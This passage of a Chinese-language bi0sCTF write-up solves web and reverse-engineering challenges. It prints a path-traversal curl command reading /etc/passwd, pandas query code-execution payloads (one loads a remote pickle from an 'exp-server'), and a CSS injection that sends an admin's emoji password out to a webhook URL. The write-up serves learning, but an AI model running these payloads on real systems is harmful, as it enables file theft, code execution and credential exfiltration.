+            <span class="hljs-comment"># ssrf -&gt; bypass waf -&gt; blind sqli, fol=. or fol=/</span>
+            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;INDEX&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s.get(<span class="hljs-string">f&quot;<span class="hljs-subst">{base_url}</span>/view.php?fol=.&amp;file=http://<span class="hljs-subst">{txt}</span>&quot;</span>).text:
+                flag += token
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bi0sctf{{<span class="hljs-subst">{flag}</span>}}&quot;</span>, end=<span class="hljs-string">&#x27;\r&#x27;</span>)
+                <span class="hljs-keyword">break</span>
+
+<span class="hljs-built_in">print</span>()
+</code></pre><h3 id="pycgimisc"><a class="header-link" href="#pycgimisc"></a>PyCGI(misc?):</h3>
+<h4 id="任意文件读取"><a class="header-link" href="#任意文件读取"></a>任意文件读取:</h4>
+<p>这道题的附件很简单，在 <code>nginx.conf</code> 里面可以发现一个任意文件读取：</p>
+<pre class="hljs"><code>ocation /<span class="hljs-keyword">static</span> {
+    <span class="hljs-keyword">alias</span> /<span class="hljs-keyword">static</span>/;
+}</code></pre><p>通过 <code>curl http://instance.chall.bi0s.in:10332/static../etc/passwd --path-as-is</code> 就可以实现任意文件读取。</p>
+<h4 id="探索题目环境"><a class="header-link" href="#探索题目环境"></a>探索题目环境:</h4>
+<p>由于题目附件给的东西很少，所以需要我们自己利用任意文件读取去取环境里面的东西，在靶机的根目录下有三个文件夹</p>
+<p class="img-container"><img src="https://imgur.com/m5owfxb.png" alt=""></p>
+<p><code>cgi-bin</code> 需要 HTTP 认证暂时先跳过, <code>database</code> 下面是一个 csv，<code>templates</code> 打开有一个 form</p>
+<p class="img-container"><img src="https://imgur.com/SpQN9wR.png" alt=""></p>
+<p>提交之后会跳转到一个 404 的路径 <code>http://instance.chall.bi0s.in:10332/templates/search_currency.py?currency_name=a</code>，猜测 <code>cgi-bin</code> 下有一个 <code>search_currency.py</code>，于是通过任意文件读取拿到了 <code>/panda/cgi-bin/search_currency.py</code></p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python3</span>
+
+<span class="hljs-keyword">from</span> server <span class="hljs-keyword">import</span> Server
+<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
+
+<span class="hljs-keyword">try</span>:
+    df = pd.read_csv(<span class="hljs-string">&quot;../database/currency-rates.csv&quot;</span>)
+    server = Server()
+    server.set_header(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/html&quot;</span>)
+    params = server.get_params()
+    <span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;currency_name&quot;</span> <span class="hljs-keyword">in</span> params
+    currency_code = params[<span class="hljs-string">&quot;currency_name&quot;</span>]
+    results = df.query(<span class="hljs-string">f&quot;currency == &#x27;<span class="hljs-subst">{currency_code}</span>&#x27;&quot;</span>)
+    server.add_body(results.to_html())
+    server.send_response()
+<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Content-Type: text/html&quot;</span>)
+    <span class="hljs-built_in">print</span>()
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Exception&quot;</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(e))</code></pre><p>同样的方法可以拿到 <code>server.py</code>:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> environ
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Server</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>
+        self.response_headers = {}
+        self.response_body = <span class="hljs-string">&quot;&quot;</span>
+        self.post_body = <span class="hljs-string">&quot;&quot;</span>
+        self.request_method = self.get_var(<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>)
+        self.content_length = <span class="hljs-number">0</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_params</span>(<span class="hljs-params">self</span>):</span>
+        request_uri = self.get_var(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>) <span class="hljs-keyword">if</span>  self.get_var(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>
+        params_dict = {}
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;?&quot;</span> <span class="hljs-keyword">in</span> request_uri:
+            params = request_uri.split(<span class="hljs-string">&quot;?&quot;</span>)[<span class="hljs-number">1</span>]
+            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&amp;&quot;</span> <span class="hljs-keyword">in</span> params:
+                params = params.split(<span class="hljs-string">&quot;&amp;&quot;</span>)
+                <span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> params:
+                    params_dict[param.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">0</span>]] = param.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>]
+            <span class="hljs-keyword">else</span>:
+                params_dict[params.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">0</span>]] = params.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>]
+        <span class="hljs-keyword">return</span> params_dict
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_var</span>(<span class="hljs-params">self, variable</span>):</span>
+        <span class="hljs-keyword">return</span> environ.get(variable)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_header</span>(<span class="hljs-params">self, header, value</span>):</span>
+        self.response_headers[header] = value
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_body</span>(<span class="hljs-params">self, value</span>):</span>
+        self.response_body += value
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_file</span>(<span class="hljs-params">self, filename</span>):</span>
+        self.response_body += <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;r&quot;</span>).read()
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_response</span>(<span class="hljs-params">self</span>):</span>
+        <span class="hljs-keyword">for</span> header <span class="hljs-keyword">in</span> self.response_headers:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{header}</span>: <span class="hljs-subst">{self.response_headers[header]}</span>\n&quot;</span>)
+
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)
+        <span class="hljs-built_in">print</span>(self.response_body)
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)</code></pre><p>代码很简单，而且我们能够控制的地方并不多，大概率是通过 df.query() 实现 rce，但在此之前需要先解决 HTTP 认证的问题。</p>
+<h4 id="http-认证"><a class="header-link" href="#http-认证"></a>HTTP 认证:</h4>
+<p>由于 <code>/cgi-bin</code> 是需要通过 HTTP 认证的，所以首先想到通过 <code>static../etc/.htpasswd</code> 拿到 <code>.htpasswd</code>，这里有一个比较坑的地方，虽然密码只有一位，但是不是一个 ASCII 字符，通过一般的字典爆破解不出来。</p>
+<p>后来主办方更新了附件，提供了 <code>Dockerfile</code>，发现并没有在构建容器的时候就生成 <code>.htpasswd</code>，于是想到去拿 <code>/docker-entrypoint.sh</code></p>
+<p class="img-container"><img src="https://imgur.com/USX5pzQ.png" alt=""></p>
+<p>可以发现 admin 的密码是 <code>\xc2\xad</code>，通过 <code>base64.b64encode(b&#39;admin:\xc2\xad&#39;)</code> 生成 HTTP 认证头 <code>Authorization: Basic YWRtaW46wq0=</code>，测试通过 HTTP 认证</p>
+<p class="img-container"><img src="https://imgur.com/hmSbUPh.png" alt=""></p>
+<h4 id="pandas-rce"><a class="header-link" href="#pandas-rce"></a>pandas rce:</h4>
+<p>在文档(<a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.query.html)中可以看到这样一句话：">https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.query.html)中可以看到这样一句话：</a></p>
+<blockquote>
+<p>You can refer to variables in the environment by prefixing them with an ‘@’ character like <code>@a + b</code>.</p>
+</blockquote>
+<p>所以我们可以把引号闭合之后通过 <code>@</code> 来实现 rce，方法就很多了，但还是有几点要注意一下：</p>
+<ul class="list">
+<li>因为是直接通过 nginx 传给 cgi，所以不需要 url 编码</li>
+<li>由于 <code>server.py</code> 里面是通过 <code>=</code> 来分割字符的，所以不能在 payload 里面出现 <code>=</code></li>
+</ul>
+<p>这里收集一些 payload：</p>
+<pre class="hljs"><code><span class="hljs-string">&#x27;+@pd.eval(&#x27;</span><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;ls /&quot;</span>)<span class="hljs-string">&#x27;,&#x27;</span>python<span class="hljs-string">&#x27;,&#x27;</span>python<span class="hljs-string">&#x27;,True,@pd.__builtins__)+&#x27;</span>
+
+a<span class="hljs-string">&#x27;+(@server.__class__.__init__.__globals__[&#x27;</span>__spec__<span class="hljs-string">&#x27;].loader.__init__.__globals__[&#x27;</span>sys<span class="hljs-string">&#x27;].modules[&#x27;</span>os<span class="hljs-string">&#x27;].popen(&#x27;</span>ls /<span class="hljs-string">&#x27;).read())#
+
+&#x27;</span><span class="hljs-keyword">and</span>@<span class="hljs-string">&#x27;pd&#x27;</span>.annotations.__class__.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ls &gt; /tmp/test&quot;)&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;
+
+&#x27;</span>+(@pd.io.common.os.popen(<span class="hljs-string">&#x27;ls &gt; /tmp/ls&#x27;</span>).read())+<span class="hljs-string">&#x27;
+
+&#x27;</span>|@pd.read_pickle(<span class="hljs-string">&#x27;http://exp-server/output.exploit&#x27;</span>)|<span class="hljs-string">&#x27;
+
+&#x27;</span><span class="hljs-keyword">or</span>[].__class__.__base__.__subclasses__()[<span class="hljs-number">145</span>].__init__([].__class__.__base__.__subclasses__()[<span class="hljs-number">145</span>]).__class__.__name__&lt;<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-keyword">or</span>@server.add_body([].__class__.__base__.__subclasses__()[<span class="hljs-number">145</span>]._module.sys.modules[<span class="hljs-string">&quot;subprocess&quot;</span>].check_output([<span class="hljs-string">&quot;ls&quot;</span>,<span class="hljs-string">&quot;-l&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>]).decode()).__class__.__name__&lt;<span class="hljs-string">&#x27;
+
+&#x27;</span>+@__builtins__.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;import\x20os;raise\x20Exception(os.listdir(\&quot;/\&quot;))&#x27;</span>)+<span class="hljs-string">&#x27;</span></code></pre><p>这些 payload 按照 source 可以分为利用 <code>@</code> 调用上下文中存在的函数或变量和利用字面量两种，而按照 sink 又可分为直接通过 <code>os.system()</code> ， <code>os.popen()</code> 等直接利用和通过 pickle 利用两类，限制比较少，利用方式很多非常灵活。大多数利用方式都比较常见，下面对 pandas 的利用做一些记录。</p>
+<h5 id="pdeval"><a class="header-link" href="#pdeval"></a>pd.eval:</h5>
+<p>通过官方文档（<a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.eval.html#pandas.eval）我们可以发现它跟">https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.eval.html#pandas.eval）我们可以发现它跟</a> python 的内置 eval 差不多，在接受 expr 参数的同时也支持设置 <code>globals</code> 和 <code>locals</code>。不同的是，pandas 在性能的考量下还实现了自己的 parser 和 engine，但是我们可以将这两个参数都设置成 <code>&#39;python&#39;</code> 来运行 builtin 的 eval。</p>
+<h5 id="pdiocommonos"><a class="header-link" href="#pdiocommonos"></a>pd.io.common.os:</h5>
+<p>其实这个算不上对于 pandas 的利用，只是通过 pandas 造了一个链去获取 <code>os</code>，类似的 gadget 还有很多，比如：<code>&#39;+(@pd.core.config_init.os.popen(&#39;calc&#39;).read())+&#39;</code></p>
+<p class="img-container"><img src="https://imgur.com/yYTtOQx.png" alt=""></p>
+<h5 id="pdread_pickle"><a class="header-link" href="#pdread_pickle"></a>pd.read_pickle:</h5>
+<p>这个其实是对于 pickle 反序列化漏洞的利用，可以在 pandas 的源码（<a href="https://github.com/pandas-dev/pandas/blob/v1.5.3/pandas/io/pickle.py#L189）中看到，这个函数其实就是对于">https://github.com/pandas-dev/pandas/blob/v1.5.3/pandas/io/pickle.py#L189）中看到，这个函数其实就是对于</a> <code>pickle.load</code> 的一个封装，可以利用现有的 pickle exp 进行利用</p>
+<h3 id="emo-locker"><a class="header-link" href="#emo-locker"></a>Emo-Locker:</h3>
+<p>审计源代码，发现存在CSS注入漏洞</p>
+<pre class="hljs"><code><span class="hljs-built_in">this</span>.setState(<span class="hljs-function">(<span class="hljs-params">prevState</span>) =&gt;</span> {
+    <span class="hljs-keyword">let</span> href = <span class="hljs-string">`https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/<span class="hljs-subst">${
+        <span class="hljs-built_in">window</span>.location.hash.replace(<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+    }</span>-mode.css`</span>;
+    prevState.link_obj.href = href;
+    <span class="hljs-keyword">return</span> {}
+});</code></pre><p>通过构造形如<code>#../../gh/thezzisu/assets/public/css/902.css?</code>的hash可以注入我们可控的CSS文件。</p>
+<p>观察到在点击emoji图标后，对应的<code>&lt;span&gt;</code>会被清空。使用CSS伪选择器<code>:empty</code>配合设置background-img即可向可控的url发送请求。</p>
+<p>使用的payload如下：</p>
+<pre class="hljs"><code>span[aria-label=<span class="hljs-string">&quot;1&quot;</span>]:empty {
+  background-image: url(<span class="hljs-string">&quot;https://webhook.site/0b13d0cd-8f43-472c-98ac-de23aba8b2c2/?img=1&quot;</span>);
+}
+<span class="hljs-comment">/* multiple repeated items... */</span></code></pre><p>即可获取admin bot输入的emoji密码内容，使用用户名admin即可登录并在返回的HTTP Response Header中获得flag。</p>
+<h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse:</h2>
+<h3 id="lowkeyenc"><a class="header-link" href="#lowkeyenc"></a>lowkeyEnc:</h3>
+<p>读取文件后，先对明文做了两次AES256 CBC加密，随后每一位与索引进行异或，最后根据密文生成图片</p>
+<p>动调后得到AES加密的密钥与iv，同时图片最后一行的rgb颜色对应了密文的每一位字节</p>
+<pre class="hljs"><code>key = [
+    <span class="hljs-number">0x52</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x3F</span>, 
+    <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x4D</span>, 
+    <span class="hljs-number">0x10</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xE2</span>, 
+    <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x49</span>
+]
+
+iv = [
+    <span class="hljs-number">0x81</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xE9</span>, 
+    <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xCB</span>
+]
+
+cipherText = []
+
+<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
+
+image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;enc.png&#x27;</span>)
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):
+    r, g, b, a = image.getpixel((i, <span class="hljs-number">99</span>))
+    <span class="hljs-keyword">if</span> a != <span class="hljs-number">0</span>:
+        cipherText.append(r)
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipherText)):
+    cipherText[i] ^= i
+
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
+
+cipher = AES.new(<span class="hljs-built_in">bytes</span>(key), AES.MODE_CBC, <span class="hljs-built_in">bytes</span>(iv))
+
+plainText = cipher.decrypt(<span class="hljs-built_in">bytes</span>(cipherText))
+<span class="hljs-built_in">print</span> (plainText)
+cipher = AES.new(<span class="hljs-built_in">bytes</span>(key), AES.MODE_CBC, <span class="hljs-built_in">bytes</span>(iv))
+
+plainText = cipher.decrypt(plainText[:-<span class="hljs-number">16</span>])
+<span class="hljs-built_in">print</span> (plainText)</code></pre><h3 id="rusted"><a class="header-link" href="#rusted"></a>Rusted:</h3>
+<p>对输入进行sm4_cbc加密，key = <code>554248506A424B6C73513254754E536B</code>, iv= <code>3779304D3639545153636D376D665876</code>, 根据加密后的内容动态生成汇编代码函数，比如加密后的内容为
+<code>1111111122222222333333334444444455555555666666667777777788888888</code> ，生成的代码就是下面那样的</p>
+<pre class="hljs"><code>[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C000 sub_55BA5DF3C000 proc near</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C000 mov     rax, 11111111h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C007 mov     rcx, 0FFFFFFFF93A3F3CDh</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C00E sub     rax, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C011 mov     rcx, 22222222h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C018 add     rax, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C01B mov     rcx, 1337BEEFh</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C022 xor     rax, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C025 mov     rcx, 33AEF5CBh</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C02C sub     rax, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C02F mov     rcx, 33333333h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C036 add     rax, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C039 mov     rcx, 44444444h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C040 mov     rdx, 55555555h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C047 mov     rbx, rax</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C04A xor     rax, rdx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C04D xor     rbx, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C050 mov     rdx, 550D68CEh</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C057 sub     rax, rdx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C05A mov     rdx, 5F9751EBh</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C061 sub     rbx, rdx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C064 add     rax, rbx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C067 mov     rcx, 66666666h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C06E mov     rdx, 77777777h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C075 add     rcx, rax</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C078 add     rdx, rax</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C07B mov     rax, 0FFFFFFFF88888888h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C082 xor     rdx, rax</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C085 xor     rcx, rax</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C088 mov     rax, 4AA34A4h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C08F mov     rbx, 2C786553h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C096 sub     rbx, rdx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C099 sub     rax, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C09C add     rax, rbx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C09F mov     rcx, 33333333h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0A6 add     rax, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0A9 mov     rcx, 44444444h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0B0 mov     rdx, 55555555h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0B7 xor     rax, rdx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0BA xor     rax, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0BD mov     rbx, 74180051h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0C4 sub     rax, rbx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0C7 mov     rcx, 66666666h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0CE add     rax, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0D1 mov     rcx, 77777777h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0D8 mov     rdx, 0FFFFFFFF88888888h</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0DF xor     rax, rdx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0E2 xor     rax, rcx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0E5 mov     rbx, 3E07994Ch</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0EC sub     rax, rbx</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0EF retn</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0EF</span>
+[<span class="hljs-symbol">heap</span>]:<span class="hljs-link">000055BA5DF3C0EF sub_55BA5DF3C000 endp</span></code></pre><p>根据上述代码和提示，写出脚本即可</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> gmssl.sm4 <span class="hljs-keyword">import</span> CryptSM4, SM4_DECRYPT
+<span class="hljs-keyword">import</span> z3
+
+i = [z3.BitVec(<span class="hljs-string">f&#x27;i<span class="hljs-subst">{_}</span>&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]
+solver = z3.Solver()
+solver.add(i[<span class="hljs-number">0</span>] - <span class="hljs-number">0x93A3F3CD</span> == <span class="hljs-number">0</span>)
+solver.add((i[<span class="hljs-number">1</span>] ^ <span class="hljs-number">0x1337BEEF</span>) - <span class="hljs-number">0x33AEF5CB</span> == <span class="hljs-number">0</span>)
+solver.add((i[<span class="hljs-number">2</span>] ^ i[<span class="hljs-number">4</span>]) - <span class="hljs-number">0x550D68CE</span> == <span class="hljs-number">0</span>)
+solver.add((i[<span class="hljs-number">2</span>] ^ i[<span class="hljs-number">3</span>]) - <span class="hljs-number">0x5F9751EB</span> == <span class="hljs-number">0</span>)
+solver.add(<span class="hljs-number">0x2C786553</span> - (i[<span class="hljs-number">6</span>] ^ i[<span class="hljs-number">7</span>]) == <span class="hljs-number">0</span>)
+solver.add(<span class="hljs-number">0x04AA34A4</span> - (i[<span class="hljs-number">5</span>] ^ i[<span class="hljs-number">7</span>]) == <span class="hljs-number">0</span>)
+solver.add((i[<span class="hljs-number">2</span>] ^ i[<span class="hljs-number">3</span>] ^ i[<span class="hljs-number">4</span>]) - <span class="hljs-number">0x74180051</span> == <span class="hljs-number">0</span>)
+solver.add((i[<span class="hljs-number">5</span>] ^ i[<span class="hljs-number">6</span>] ^ i[<span class="hljs-number">7</span>]) - <span class="hljs-number">0x3E07994C</span> == <span class="hljs-number">0</span>)
+
+<span class="hljs-keyword">if</span> solver.check() == z3.sat:
+    m = solver.model()
+    e = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">hex</span>(m[i[_]].as_long()).replace(<span class="hljs-string">&quot;0x&quot;</span>, <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>))
+    <span class="hljs-built_in">print</span>(e)
+    e = <span class="hljs-built_in">bytes</span>.fromhex(e)
+    sm4 = CryptSM4()
+    sm4.set_key(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;554248506A424B6C73513254754E536B&quot;</span>), SM4_DECRYPT)
+    <span class="hljs-built_in">print</span>(sm4.crypt_cbc(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;3779304D3639545153636D376D665876&#x27;</span>), e))</code></pre><h3 id="eerie_jit"><a class="header-link" href="#eerie_jit"></a>Eerie_jit:</h3>
+<p>(本题也是看得比较晚了赛后4min出了...比较可惜)</p>
+<p>先验证了flag头的8个字节，随后16字节表示为4个int数值</p>
+<p>随后进入jit部分，opcode如下</p>
+<pre class="hljs"><code>opcode = [
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span>x35, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x35, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E,
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span>x35, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x35, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span>x35, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x35, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span>x35, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    0x35,</span> <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3E, 
+<span class="hljs-built_in">    
+    0x30,</span> <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x31, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3D, <span class="hljs-number">3</span>, 
+<span class="hljs-built_in">    0x30,</span> <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x31, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3D, <span class="hljs-number">3</span>, 
